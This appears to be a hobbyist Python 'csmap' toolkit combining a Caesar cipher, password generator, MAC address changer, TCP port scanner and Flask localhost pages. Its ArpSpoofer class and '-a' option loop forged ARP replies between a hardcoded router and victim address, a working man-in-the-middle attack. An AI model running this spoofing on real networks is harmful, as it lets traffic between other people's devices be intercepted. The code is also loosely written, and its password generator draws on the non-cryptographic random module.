#!/usr/bin/python3

'''
C-Caeser Cipher
S-Strong password generator
M-Mac Spoofer
A-Arp scanner
P-port scanner
This will be a command line project with some web interface that may be run on localhost.
I am going to use sys module , os module and some extra related modules.
'''

import argparse
import sys
import os
import string
import subprocess
from socket import *
import optparse
from threading import *
import random
from termcolor import colored
from time import sleep
import scapy.all as scapy
from flask import Flask, render_template

app = Flask(__name__)


# print("csmap")

class CaeserCipher:
    def __init__(self, text, s):
        self.text = text
        self.s = s

    def encrypt(self):
        result = ""

        # traverse text
        for i in range(len(self.text)):
            char = self.text[i]

            # Encrypt uppercase characters
            if (char.isupper()):
                result += chr((ord(char) + self.s-65) % 26 + 65)

            # Encrypt lowercase characters
            else:
                result += chr((ord(char) + self.s - 97) % 26 + 97)

        return result

        # I have to create a decrypt algo and there should be a concept of key.


class PassGenerator:
    def __init__(self, l):
        self.s1 = list(string.ascii_lowercase)
        self.s2 = list(string.ascii_uppercase)
        self.s3 = list(string.digits)
        self.s4 = list(string.punctuation)
        self.s = []
        self.s.extend(self.s1)
        self.s.extend(self.s2)
        self.s.extend(self.s3)
        self.s.extend(self.s4)
        self.passlen = l

        if self.passlen < 8:
            print(colored('''\tYou entered a length which is too small.
        Its easy to crack by any Cracker..
        So, I will create a 8 letters password for you
        I hope you dont mind it''', 'yellow'))
            print(colored("".join(random.sample(self.s, 8)),
                          'green', attrs=['bold', 'blink']))
        elif self.passlen > 94:
            print(
                colored(f"Where to use {self.passlen} letters password LOL", 'yellow'))
            print(colored(
                f"If you really want to create a password of {self.passlen} letters then Enter", 'blue'))
            typed_string = input("")
            x = self.passlen // 94
            y = self.passlen % 94
            print(colored(("".join(random.sample(self.s, 94))) * x +
                          ("".join(random.sample(self.s, y))), 'green', attrs=['bold']))
        else:
            print(colored("Yup! Good choice of password length..!!", 'yellow'))
            print(colored("".join(random.sample(self.s, self.passlen)),
                          'green', attrs=['bold']))


class MacSpoofer:
    def __init__(self):
        print(colored("hey here i will create a MacSpoofer program"), 'red')
        pass

    def changeMACadd(interface, mac):
        subprocess.call(["ifconfig", interface, "down"])
        subprocess.call(["ifconfig", interface, "hw", "ether", mac])
        subprocess.call(["ifconfig", interface, "up"])


class ArpSpoofer:
    def __init__(self):
        print("hey here i will create a ArpSpoofer program")
    def get_target_mac(ip):
        arp_request= scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet=broadcast/arp_request
        answer=scapy.srp(final_packet,timeout=2,verbose=False)[0]
        mac=answer[0][1].hwsrc
        return mac    

    def spoof_arp(target_ip,spoofed_ip):
        mac= ArpSpoofer.get_target_mac(target_ip) 
        packet=scapy.ARP(op=2,hwdst=mac,pdst=target_ip,psrc=spoofed_ip)
        scapy.send(packet,verbose=False)


class PortScanner:
    def __init__(self):
        pass

    def connScan(tgtHost, tgtPort):
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.connect((tgtHost, tgtPort))
            print(colored(f"[+] {tgtPort}/tcp Open", 'green'))
        except:
            print(colored(f"[-] {tgtPort}/tcp Closed", 'red'))
        finally:
            sock.close()

    def portScan(tgtHost, tgtPorts):
        try:
            tgtIP = gethostbyname(tgtHost)
        except:
            print(colored(f"Unknown Host {tgtHost}", 'blue'))
        try:
            tgtName = gethostbyaddr(tgtIP)
            print(colored(f"[+] Scan Results For: {tgtName[0]} ", 'blue'))
            # print(tgtName) --> ('kali', [], ['192.168.1.8', '172.17.0.1'])
        except:
            print(colored(f"[+] Scan Results For: {tgtIP}", 'blue'))
        setdefaulttimeout(1)
        for tgtPort in tgtPorts:
            t = Thread(target=PortScanner.connScan,
                       args=(tgtHost, int(tgtPort)))
            t.start()


# -----------------------------------------------------------------------------------------

# Web application


@app.route('/')
def help():
    return render_template('index.html')


@app.route('/portScanner')
def portScanner():
    return render_template('portScanner.html')


@app.route('/arpSpoofer')
def arpSpoofer():
    return render_template('arpSpoofer.html')


@app.route('/macSpoofer')
def macSpoofer():
    return render_template('macSpoofer.html')


@app.route('/passGenerator')
def passGenerator():
    return render_template('passGenerator.html')


@app.route('/caesercipher')
def caesercipher():
    return render_template('caesercipher.html')


@app.route('/contact')
def contact():
    return render_template('contact.html')


@app.route('/about')
def about():
    return render_template('about.html')


# -----------------------------------------------------------------------------------------


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    try:
        fPlace = sys.argv[1]
        if fPlace == '-c' or fPlace == '-h' or fPlace == '--help':
            parser.add_argument('-c', type=str,
                                default=None,
                                help='csmap -c <text> -k <key> ')
            parser.add_argument('-k', type=int,
                                default=None,
                                help='csmap -c <text> -k <key> ')
            args = parser.parse_args()
            # val=sys.stdout.write(str(c.encrypt()))
            c = CaeserCipher(args.c, args.k)
            val = c.encrypt()
            print(colored(f"Text: \'{args.c}\' ", 'yellow'))
            print(
                colored(f"Caeser Cipher Text: \'{val}\' ", 'green', attrs=['bold']))

        elif fPlace == '-l' or fPlace == '-h' or fPlace == '--help':
            parser.add_argument('-l', type=int,
                                default=None,
                                help='csmap -s <length of password>')
            args = parser.parse_args()
            PassGenerator(args.l)

        elif fPlace == '-p' or fPlace == '-H' or fPlace == '--help':

            parser = optparse.OptionParser(
                'Usage of program : ' + '-H <target host> -p <target port>')
            parser.add_option('-H', dest='tgtHost',
                              type='string', help='specify target host')
            parser.add_option('-p', dest='tgtPort', type='string',
                              help='specify target ports separated by comma')
            options, args = parser.parse_args()  # dictionary

            # print(options)  # --> {'self.tgtHost': '192.168.1.8', 'self.tgtPort': '80'}
            # print(args) #--> []

            tgtHost = options.tgtHost
            tgtPorts = str(options.tgtPort).split(',')
            if (tgtHost == None) | (tgtPorts[0] == None):
                print(parser.usage)
                exit(0)
            PortScanner.portScan(tgtHost, tgtPorts)

        elif fPlace == '-m':
            parser.add_argument('-m', type=str,
                                default=None,
                                help='csmap -m ')

            interface = input("[+] Enter Interface to change MAC Address On: ")
            newMACadd = input("[+] Enter MAC Address to change to: ")

            beforeChange = subprocess.check_output(["ifconfig", interface])
            MacSpoofer.changeMACadd(interface, newMACadd)
            afterChange = subprocess.check_output(["ifconfig", interface])
            if beforeChange == afterChange:
                print(
                    colored(f"[-] Failed to change mac address to {newMACadd} ", "red"))
            else:
                print(colored(
                    f"[+] MAC address changed to {newMACadd} on interface {interface} ", "blue"))

        elif fPlace == 'help':
            app.run(host="127.0.0.1", port=8080, debug=True)

        elif fPlace == '-a':
            try:
                while True:
                    # spoof_arp("ip_of_router","ip_of_victim")
                    ArpSpoofer.spoof_arp("192.168.1.1","192.168.1.5")
                    ArpSpoofer.spoof_arp("192.168.1.5","192.168.1.1")
                    # spoof_arp("ip_of_victim","ip_of_router")

            except KeyboardInterrupt:
                print(colored("\n[-] Stopping!!","red"))
                sleep(2)
                exit(0)

        else:
            print(
                "csmap -c <text> -k <key> \ncsmap -s <length of password>\ncsmap -p <port no.> <ip address> ")

    except:
        print("csmap -c <text> -k <key> \ncsmap -s <length of password>\ncsmap -p <port no.> <ip address> \ncsmap -m ")
